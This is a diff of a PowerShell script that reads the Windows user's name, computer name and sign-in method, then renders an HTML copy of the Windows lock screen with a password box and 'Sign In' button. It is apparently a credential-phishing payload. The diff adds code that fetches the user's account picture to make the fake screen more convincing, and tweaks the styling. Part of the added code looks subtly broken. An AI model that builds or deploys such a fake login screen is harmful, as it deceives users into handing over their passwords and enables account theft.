@@ -1,4 +1,3 @@
-
 # GATHER SYSTEM AND USER INFO
 $u = (Get-WmiObject Win32_UserAccount -Filter "Name = '$Env:UserName'").FullName
 $c = $env:COMPUTERNAME
@@ -10,6 +9,15 @@ if ($value -eq 0 -or $value -eq 1) {
 } else {
     $mthd = "Password"
 }
+
+$accountPicturesPath = "C:\Users\Public\AccountPictures"
+
+$imageFiles = Get-ChildItem -Path $accountPicturesPath -Filter *.jpg, *.png, *.bmp -File -Recurse
+if ($imageFiles.Count -gt 0) {
+$firstImage = $imageFiles[0].FullName
+$image = [System.Drawing.Image]::FromFile($firstImage)
+$usrimg = "$image"
+}else {$usrimg = "https://www.tenforums.com/geek/gars/images/2/types/thumb_14400082930User.png"}
 
 $h = @"
 <!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>&#65279;</title><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.5.0/css/bootstrap.min.css"><link href="https://fonts.googleapis.com/css?family=Open+Sans+Condensed:300&display=swap" rel="stylesheet"><style>@import url(https://fonts.googleapis.com/css2?family=Open+Sans:wght@600&display=swap);body{background:rgba(0,0,0,1);margin:0;padding:0;overflow-x:hidden}#container{height:100vh;width:100vw;overflow:hidden;position:relative}#wallpaper{background-image:url($wpURL);background-repeat:no-repeat;background-size:100% cover;background-position:center;height:100vh;width:100vw;position:absolute;top:0;left:0}#wallpaper.slideUp{transition:all .6s ease;transform:translateY(-100%)}#wallpaper.slideDown{transition:all .6s linear;transform:translateY(0)}.icons{display:flex;justify-content:flex-start;align-items:center;padding-left:.5em}.icons i{color:#fff;margin-top:.7em;margin-right:2em}#date_cont{text-align:center;position:absolute;top:20%;left:42%;animation:slideInFast .3s .3s linear forwards;visibility:hidden;transform:translateY(150%);transition:all .6s ease both}@keyframes slideInFast{from{visibility:hidden;opacity:0;transform:translateY(100%)}to{visibility:visible;opacity:1;transform:translateY(0)}}#time{font-size:7.5em;font-family:'Open Sans',sans-serif;color:#fff;margin:0;margin-left:-15px;padding:0}#date{font-size:2em;font-family:'Open Sans',sans-serif;color:#fff;margin-top:-.6em}</style></head><body><div id="container"><div id="wallpaper"><div id="date_cont"><div id="time">08:20</div><div id="date" class="">Tuesday, October 8</div><div class="icons"><i class="fa fa-wifi"></i><i class="fa fa-battery-full"></i></div></div></div></div><script type="text/javascript">(function(){ 
@@ -104,7 +112,7 @@ $h2 = @"
 
     .input-box {
       width: 300px;
-      height: 40px;
+      height: 35px;
       color: white;
       background-color: rgba(96, 96, 96, 0.2);
       border: 1px solid #e6e6e6;
@@ -130,7 +138,7 @@ $h2 = @"
 
     /* Style the "Sign In" button */
     .btn-signin {
-      width: 130px;
+      width: 140px;
       height: 40px;
       background-color: rgba(96, 96, 96, 0.2);
       border: 1px solid #e6e6e6;
@@ -151,10 +159,10 @@ $h2 = @"
       color: white;
     }
     .circular-image {
-    width: 6vw; /* Set width relative to viewport width */
-    height: 6vw; /* Set height relative to viewport width */
+    width: 180px; /* Set width relative to viewport width */
+    height: 180px; /* Set height relative to viewport width */
     border-radius: 50%; /* Make it circular */
-    border: 2px solid white;
+    border: 2px solid #e6e6e6;
     margin-bottom: 10px;
 }
 </style>
